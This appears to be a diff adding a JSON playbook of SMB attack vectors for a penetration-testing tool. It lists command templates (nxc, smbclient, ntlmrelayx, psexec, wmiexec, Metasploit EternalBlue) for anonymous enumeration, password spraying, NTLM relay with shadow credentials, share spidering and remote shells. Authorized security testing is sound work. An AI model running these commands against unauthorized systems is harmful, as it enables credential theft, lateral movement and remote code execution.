@@ -1,0 +1,184 @@
+{
+  "service": "SMB",
+  "description": "Server Message Block - Windows file sharing protocol",
+  "ports": [139, 445],
+  "serviceNames": ["smb", "microsoft-ds", "netbios-ssn"],
+  "targetOs": ["Windows", "Linux"],
+  "vectors": [
+    {
+      "id": "smb_anonymous_enum",
+      "name": "Anonymous SMB Enumeration",
+      "phase": "reconnaissance",
+      "prerequisites": [],
+      "description": "Attempt to enumerate SMB shares without authentication",
+      "commands": [
+        {
+          "tool": "nxc",
+          "syntax": "nxc smb <target> -u '' -p ''",
+          "description": "Test anonymous access with empty credentials"
+        },
+        {
+          "tool": "nxc",
+          "syntax": "nxc smb <target> -u 'a' -p ''",
+          "description": "Test guest access"
+        },
+        {
+          "tool": "smbclient",
+          "syntax": "smbclient -U '%' -L //<target>",
+          "description": "List shares anonymously"
+        },
+        {
+          "tool": "enum4linux-ng",
+          "syntax": "enum4linux-ng.py -a -u '' -p '' <target>",
+          "description": "Comprehensive SMB enumeration"
+        }
+      ],
+      "outcomes": ["shares_found", "anonymous_access", "user_list"]
+    },
+    {
+      "id": "smb_vulnerability_scan",
+      "name": "SMB Vulnerability Scanning",
+      "phase": "reconnaissance",
+      "prerequisites": [],
+      "description": "Scan for known SMB vulnerabilities like EternalBlue",
+      "commands": [
+        {
+          "tool": "nmap",
+          "syntax": "nmap -Pn --script smb-vuln* -p139,445 <target>",
+          "description": "Run all SMB vulnerability NSE scripts"
+        },
+        {
+          "tool": "nxc",
+          "syntax": "nxc smb <target>",
+          "description": "Check SMB signing and version info"
+        }
+      ],
+      "outcomes": ["vulnerable_host", "smb_signing_disabled", "smb_version"]
+    },
+    {
+      "id": "smb_user_enum",
+      "name": "SMB User Enumeration",
+      "phase": "reconnaissance",
+      "prerequisites": [],
+      "description": "Enumerate domain users via SMB",
+      "commands": [
+        {
+          "tool": "nxc",
+          "syntax": "nxc smb <target> --users",
+          "description": "List domain users"
+        },
+        {
+          "tool": "nxc",
+          "syntax": "nxc smb <target> --rid-brute 10000",
+          "description": "Bruteforce RIDs to find users"
+        }
+      ],
+      "outcomes": ["username"]
+    },
+    {
+      "id": "smb_password_spray",
+      "name": "SMB Password Spraying",
+      "phase": "credential_access",
+      "prerequisites": ["username"],
+      "description": "Attempt authentication with common passwords",
+      "commands": [
+        {
+          "tool": "nxc",
+          "syntax": "nxc smb <target> -u <user_list> -p <password>",
+          "description": "Spray a single password across multiple users"
+        },
+        {
+          "tool": "nxc",
+          "syntax": "nxc smb <target> -u <user> -p <password_list> --no-bruteforce",
+          "description": "Try multiple passwords for a single user"
+        }
+      ],
+      "outcomes": ["valid_credentials", "valid_user"]
+    },
+    {
+      "id": "smb_relay",
+      "name": "SMB Relay Attack",
+      "phase": "lateral_movement",
+      "prerequisites": ["smb_signing_disabled"],
+      "description": "Relay SMB authentication to other hosts",
+      "commands": [
+        {
+          "tool": "ntlmrelayx",
+          "syntax": "ntlmrelayx.py -tf <target_list> -smb2support",
+          "description": "Basic SMB relay"
+        },
+        {
+          "tool": "ntlmrelayx",
+          "syntax": "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --shadow-credentials --shadow-target '<dc_name$>'",
+          "description": "Relay to LDAPS for shadow credentials"
+        }
+      ],
+      "outcomes": ["shell", "code_execution", "shadow_credentials"]
+    },
+    {
+      "id": "smb_authenticated_enum",
+      "name": "Authenticated SMB Enumeration",
+      "phase": "lateral_movement",
+      "prerequisites": ["valid_credentials"],
+      "description": "Deep enumeration with valid credentials",
+      "commands": [
+        {
+          "tool": "nxc",
+          "syntax": "nxc smb <target> -u <user> -p <password> --shares",
+          "description": "List all accessible shares"
+        },
+        {
+          "tool": "nxc",
+          "syntax": "nxc smb <target> -u <user> -p <password> --spider <share> --pattern txt,xml,config",
+          "description": "Spider shares for sensitive files"
+        },
+        {
+          "tool": "smbmap",
+          "syntax": "smbmap -H <target> -u <user> -p <password> -R",
+          "description": "Recursively list all shares and permissions"
+        }
+      ],
+      "outcomes": ["sensitive_files", "writable_shares"]
+    },
+    {
+      "id": "smb_psexec",
+      "name": "SMB PsExec Remote Execution",
+      "phase": "lateral_movement",
+      "prerequisites": ["valid_credentials", "admin_access"],
+      "description": "Execute commands remotely via SMB",
+      "commands": [
+        {
+          "tool": "psexec",
+          "syntax": "psexec.py <domain>/<user>:<password>@<target>",
+          "description": "Get remote shell via PsExec"
+        },
+        {
+          "tool": "nxc",
+          "syntax": "nxc smb <target> -u <user> -p <password> -x <command>",
+          "description": "Execute single command"
+        },
+        {
+          "tool": "wmiexec",
+          "syntax": "wmiexec.py <domain>/<user>:<password>@<target>",
+          "description": "Execute via WMI (stealthier)"
+        }
+      ],
+      "outcomes": ["shell", "code_execution"]
+    },
+    {
+      "id": "smb_eternalblue",
+      "name": "EternalBlue Exploit (MS17-010)",
+      "phase": "exploitation",
+      "prerequisites": ["vulnerable_host"],
+      "description": "Exploit SMBv1 vulnerability for remote code execution",
+      "commands": [
+        {
+          "tool": "metasploit",
+          "syntax": "use exploit/windows/smb/ms17_010_eternalblue",
+          "description": "Metasploit EternalBlue module"
+        }
+      ],
+      "outcomes": ["shell", "system_access"]
+    }
+  ]
+}
